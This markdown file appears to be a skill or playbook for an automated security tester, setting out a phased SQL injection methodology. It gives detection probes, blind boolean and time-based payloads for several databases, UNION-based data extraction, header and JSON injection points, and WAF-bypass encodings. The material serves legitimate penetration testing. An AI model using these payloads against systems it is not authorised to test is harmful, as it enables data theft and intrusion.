---
name: sql-injection-testing
category: vulnerabilities
description: Testing methodology for SQL injection across all contexts
attack_types: [sql_injection, sqli_error, sqli_blind, sqli_time, sqli_union]
severity_range: [critical, high]
---

# SQL Injection Testing Methodology

## Phase 1: Detection (Error-Based)

Send these probes to every injectable parameter. Watch for database error messages in the response body, not just status codes.

### Initial Probes (ordered by specificity)
1. Single quote: `'` — watch for SQL syntax errors
2. Double quote: `"` — some databases use this
3. Backslash: `\` — escape character probe
4. Comment terminator: `'--` — should suppress errors if injectable
5. Arithmetic: `1 AND 1=1` vs `1 AND 1=2` — compare response lengths

### Error Signatures to Match
- MySQL: `You have an error in your SQL syntax`, `mysql_fetch`
- PostgreSQL: `ERROR: syntax error at or near`, `PG::SyntaxError`
- MSSQL: `Unclosed quotation mark`, `Microsoft OLE DB`
- SQLite: `SQLITE_ERROR`, `near "`: syntax error`
- Oracle: `ORA-01756`, `quoted string not properly terminated`
- Generic: `SQL`, `query`, `syntax`, `database` in error page

## Phase 2: Confirmation (Boolean-Based Blind)

If no errors visible, try boolean-based detection:

1. True condition: `' OR '1'='1` — should return normal page
2. False condition: `' OR '1'='2` — should return different page
3. Compare response lengths. Difference > 50 bytes = likely injectable.
4. Numeric context: `1 OR 1=1` vs `1 OR 1=2`
5. String context: `' OR 'a'='a` vs `' OR 'a'='b`

## Phase 3: Time-Based Blind

If boolean detection inconclusive:

1. MySQL: `' OR SLEEP(5)-- -`
2. PostgreSQL: `'; SELECT pg_sleep(5)-- -`
3. MSSQL: `'; WAITFOR DELAY '0:0:5'-- -`
4. SQLite: `' OR randomblob(500000000)-- -` (CPU delay)

**Timing threshold**: Response > 4.5 seconds = likely injectable. Run 3 times to confirm consistency.

## Phase 4: Exploitation (UNION-Based)

1. Find column count: `' ORDER BY 1-- -`, increment until error
2. Find display column: `' UNION SELECT NULL,NULL,...-- -` with one column as `@@version`
3. Extract data: `' UNION SELECT table_name,NULL FROM information_schema.tables-- -`

## Phase 5: Advanced Contexts

### JSON parameters
```json
{"id": "1 OR 1=1"}
{"search": "' UNION SELECT NULL-- -"}
```

### Header injection
- Cookie values: `session=xxx' OR '1'='1`
- X-Forwarded-For: `127.0.0.1' OR '1'='1`
- Referer: `https://example.com/' OR '1'='1`

### WAF Bypass Encodings
1. URL encode: `%27%20OR%20%271%27%3D%271`
2. Double URL encode: `%2527`
3. Unicode: `%u0027`
4. Mixed case: `' oR '1'='1`
5. Comment insertion: `'/**/OR/**/1=1-- -`
6. Hex encoding: `0x27`

## False Positive Prevention

- Error message must contain SQL-specific keywords, not generic 500 errors
- Boolean tests must show CONSISTENT difference (run 3+ times)
- Time-based tests must show CONSISTENT delay (variance < 1 second)
- UNION results must return actual data rows, not just different page sizes
- Check if WAF is returning fake error pages (look for WAF fingerprints)

## Success Indicators

- **Confirmed**: Database error with SQL keywords, OR consistent boolean difference, OR consistent time delay
- **Data Exfiltration**: UNION query returns database contents
- **Evidence Required**: Full HTTP request + response showing the injection
